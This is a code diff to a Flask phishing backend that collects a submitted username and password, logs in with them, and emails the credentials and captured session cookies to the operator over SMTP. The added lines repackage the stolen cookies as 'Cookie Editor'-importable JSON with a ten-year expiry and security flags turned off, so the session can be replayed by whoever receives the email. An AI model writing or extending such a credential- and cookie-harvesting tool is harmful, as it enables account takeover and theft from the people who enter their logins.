@@ -4,6 +4,7 @@ from flask import Flask, request, render_template_string
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 import json
+from datetime import datetime, timedelta
 
 # Flask setup
 app = Flask(__name__)
@@ -75,6 +76,23 @@ def submit():
     except Exception as e:
         return f"Error during login request: {str(e)}"
 
+    # Set expiration date far in the future (10 years)
+    future_expiration = (datetime.now() + timedelta(days=3652)).strftime("%a, %d-%b-%Y %H:%M:%S GMT")
+
+    # Convert cookies to Cookie Editor-compatible JSON format
+    cookie_list = []
+    for name, value in cookies.items():
+        cookie = {
+            "name": name,
+            "value": value,
+            "domain": "example.com",  # Replace with the actual domain of the cookies
+            "path": "/",
+            "expires": future_expiration,  # Set the cookie to expire in 10 years
+            "secure": False,
+            "httpOnly": False
+        }
+        cookie_list.append(cookie)
+
     # Compose the email with form data and cookies
     message = MIMEMultipart()
     message['From'] = SMTP_USER
@@ -86,8 +104,8 @@ def submit():
     Username: {username}
     Password: {password}
 
-    Cookies: 
-    {json.dumps(cookies, indent=2)}  # Sending the cookies as formatted JSON
+    Cookies (for Cookie Editor):
+    {json.dumps(cookie_list, indent=2)}  # Sending the cookies in a format compatible with Cookie Editor
     """
     message.attach(MIMEText(body, 'plain'))
 
